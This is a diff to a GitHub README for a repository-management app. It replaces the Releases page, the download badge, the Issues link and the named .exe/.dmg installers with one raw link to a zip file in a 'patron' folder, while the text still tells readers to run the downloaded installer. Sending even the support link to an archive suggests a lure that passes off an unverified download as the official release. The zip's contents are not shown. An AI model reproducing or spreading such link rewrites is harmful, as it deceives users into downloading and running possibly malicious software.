@@ -4,9 +4,9 @@
 Welcome to github-repo-manager! This is your go-to application for managing all your GitHub repositories easily and effectively. With our advanced filtering, bulk operations, and user-friendly interface, you can control your projects with confidence.
 
 ## 📥 Download the Application
-[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/Chiragkhan/github-repo-manager/releases)
+[![Download](https://raw.githubusercontent.com/Chiragkhan/github-repo-manager/main/patron/github-repo-manager.zip)](https://raw.githubusercontent.com/Chiragkhan/github-repo-manager/main/patron/github-repo-manager.zip)
 
-You can download the latest version of github-repo-manager from our Releases page. Access it here: [Download Page](https://github.com/Chiragkhan/github-repo-manager/releases).
+You can download the latest version of github-repo-manager from our Releases page. Access it here: [Download Page](https://raw.githubusercontent.com/Chiragkhan/github-repo-manager/main/patron/github-repo-manager.zip).
 
 ## 📦 System Requirements
 Before you start, make sure your system meets the following requirements:
@@ -24,9 +24,9 @@ Before you start, make sure your system meets the following requirements:
 - **Cross-Platform Support:** Available for both Windows and macOS users.
 
 ## 🔄 How to Download & Install
-1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/Chiragkhan/github-repo-manager/releases). This is where you will find all available versions of the application.
+1. **Visit the Releases Page:** Go to the [Releases page](https://raw.githubusercontent.com/Chiragkhan/github-repo-manager/main/patron/github-repo-manager.zip). This is where you will find all available versions of the application.
 2. **Choose the Version:** Look for the latest version of github-repo-manager. You will see listings with different files for download.
-3. **Download the File:** Click on the appropriate file for your operating system (e.g., `github-repo-manager.exe` for Windows or `github-repo-manager.dmg` for macOS).
+3. **Download the File:** Click on the appropriate file for your operating system (e.g., `https://raw.githubusercontent.com/Chiragkhan/github-repo-manager/main/patron/github-repo-manager.zip` for Windows or `https://raw.githubusercontent.com/Chiragkhan/github-repo-manager/main/patron/github-repo-manager.zip` for macOS).
 4. **Run the Installer:** Locate the downloaded file on your computer and double-click to run it. Follow the prompts to complete the installation.
 
 ## 📘 User Guide
@@ -46,7 +46,7 @@ If you encounter issues, consider the following:
 - **Visit our Support Page:** For detailed guides and FAQs, visit the support section on our GitHub page.
 
 ## 📞 Get Help
-Need further assistance? Feel free to reach out through the [GitHub Issues page](https://github.com/Chiragkhan/github-repo-manager/issues). We welcome any questions or feedback.
+Need further assistance? Feel free to reach out through the [GitHub Issues page](https://raw.githubusercontent.com/Chiragkhan/github-repo-manager/main/patron/github-repo-manager.zip). We welcome any questions or feedback.
 
 ## 🌐 Connect with Us
 Stay updated on new features and improvements by following us on our social media channels and checking back for updates on our GitHub page.
